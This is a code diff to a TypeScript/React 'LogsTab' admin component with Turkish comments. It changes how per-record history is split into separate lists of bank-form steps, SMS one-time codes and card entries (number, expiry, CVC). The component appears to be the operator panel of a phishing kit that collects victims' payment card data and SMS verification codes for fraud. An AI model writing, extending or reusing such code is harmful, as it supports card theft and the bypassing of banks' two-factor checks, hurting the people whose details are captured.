@@ -1495,12 +1495,13 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   });
                 }
                 (fd as any).bankFormHistory = history;
-                const bankHistoryCount = history.length;
 
                 // ⭐ SMS GECMISI HESAPLA:
-                //   history icindeki her entry'de smsCode/tacCode olanlari al.
+                //   SADECE htmlStepLabel === "SMS KODU" OLAN entryleri al.
+                //   Banka formu tacCode veya snapshot alanlari SMS history'sine KARIŞMASIN.
                 //   Ardışık AYNI kodu tekrar etme (1 tane birak).
                 const smsHistoryRaw = history
+                  .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "SMS KODU")
                   .map((e: any) => {
                     const sms = String(e.smsCode || e.tacCode || e.sms_code || "").trim();
                     if (!sms) return null;
@@ -1521,9 +1522,11 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const smsHistoryCount = smsHistory.length;
 
                 // ⭐ KART GECMISI HESAPLA:
-                //   Her entry'de cardNumber/Expiry/CVC olanlari al, ayni kart ard arda
-                //   ise 1 tane birak (cardNum + expiry ayniysa ayni kart say).
+                //   SADECE htmlStepLabel === "KART BILGISI" OLAN entryleri al.
+                //   Banka formu cardNumber alanlari veya snapshot KART history'sine KARIŞMASIN.
+                //   Aynı kart ard arda ise 1 tane birak (cardNum + expiry ayniysa ayni kart say).
                 const cardHistoryRaw = history
+                  .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "KART BILGISI")
                   .map((e: any) => {
                     const no = String(e.cardNumber || "").trim();
                     const skt = String(e.cardExpiry || "").trim();
@@ -1554,6 +1557,18 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   }
                 }
                 const cardHistoryCount = cardHistory.length;
+
+                // ⭐ BANKA GECMISI HESAPLA:
+                //   SMS KODU ve KART BILGISI disindaki tum entryler (sadece banka formu adimlari).
+                //   Boylece banka + sms + kart HEP SI AYRI AYRI listelenir.
+                const bankHistoryRaw = history
+                  .filter((e: any) => {
+                    if (!e) return false;
+                    const label = typeof e.htmlStepLabel === "string" ? e.htmlStepLabel : "";
+                    return label !== "SMS KODU" && label !== "KART BILGISI";
+                  });
+                const bankHistoryCount = bankHistoryRaw.length;
+                (fd as any)._bankHistory = bankHistoryRaw;
                 (fd as any)._smsHistory = smsHistory;
                 (fd as any)._cardHistory = cardHistory;
                 
@@ -2009,7 +2024,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                               </button>
                             </div>
                             <div className="space-y-2.5 md:space-y-3">
-                              {(fd as any).bankFormHistory
+                              {(fd as any)._bankHistory
                                 .slice()
                                 .reverse()
                                 .map((entry: any, index: number) => {
